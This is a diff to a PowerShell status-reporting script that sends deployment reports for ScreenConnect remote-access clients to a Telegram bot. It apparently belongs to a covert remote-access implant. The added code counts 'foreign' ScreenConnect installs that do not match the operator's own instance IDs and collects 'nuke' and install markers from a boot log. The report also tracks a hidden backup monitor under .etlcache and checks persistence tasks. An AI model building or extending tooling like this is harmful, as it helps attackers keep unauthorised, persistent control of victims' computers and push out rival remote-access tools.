@@ -1,5 +1,5 @@
 #Requires -Version 5.1
-# TG_REPORT BUILD 20260802T4 - rich SC alerts + first-deploy inventory
+# TG_REPORT BUILD 20260802T5 - rich SC alerts + deploy diagnostics from boot.err
 param(
     [Parameter(Mandatory = $true)][string]$State,
     [Parameter(Mandatory = $true)][string]$Summary,
@@ -333,6 +333,25 @@ try {
 $deployBlock = ''
 if ($key -eq 'DEPLOY') {
     $verdict = if ($deployOk) { 'DEPLOYED / HEALTHY' } else { 'DEPLOYED BUT INCOMPLETE' }
+    $foreign = @(Get-ChildItem -Path "${env:ProgramFiles}\ScreenConnect Client*","${env:ProgramFiles(x86)}\ScreenConnect Client*" -Directory -ErrorAction SilentlyContinue |
+        Where-Object { $_.Name -notmatch '5f6010579852e507|f861c8140d453427' })
+    $diagLines = New-Object System.Collections.Generic.List[string]
+    $bootPath = Join-Path $WorkDir 'boot.err'
+    if (Test-Path $bootPath) {
+        $interesting = @(
+            'msi_', 'fetch_', 'primary_', 'nuke_', 'msi_too', 'msi_fetch', 'msi_exit',
+            'msi_unavailable', 'secure_', 'go_'
+        )
+        Get-Content -LiteralPath $bootPath -ErrorAction SilentlyContinue |
+            Where-Object {
+                $line = $_
+                foreach ($t in $interesting) { if ($line -like "*$t*") { return $true } }
+                $false
+            } |
+            Select-Object -Last 18 |
+            ForEach-Object { [void]$diagLines.Add(('- <code>{0}</code>' -f (Esc ($_ -replace '[^\x20-\x7E]', '?')))) }
+    }
+    if ($diagLines.Count -eq 0) { [void]$diagLines.Add('- (no install/nuke markers in boot.err)') }
     $deployBlock = @"
 
 <b>Deploy verdict</b>
@@ -342,6 +361,11 @@ if ($key -eq 'DEPLOY') {
 - Backup mon (.etlcache\etl_mon.cmd): $(if ($hasEtl) { 'YES' } else { 'NO' })
 - Persist tasks OK: $taskOk / $($expectedTasks.Count) (bad/missing: $taskBad)
 - MSI cache: $(Esc $msiSize)
+- Foreign SC folders left: $($foreign.Count)
+- Note: LastResult 267011 = task not yet run (normal right after create)
+
+<b>Deploy log markers</b>
+$($diagLines -join "`n")
 "@
 }
 
@@ -390,7 +414,7 @@ $($taskLines -join "`n")
 - MSI cache: $(Esc $msiSize)
 - WorkDir: <code>$(Esc $WorkDir)</code>
 
-<i>Bot: @nobuddyrmmBot | TG_REPORT T4</i>
+<i>Bot: @nobuddyrmmBot | TG_REPORT T5</i>
 "@
 
 $log = Join-Path $WorkDir 'boot.err'
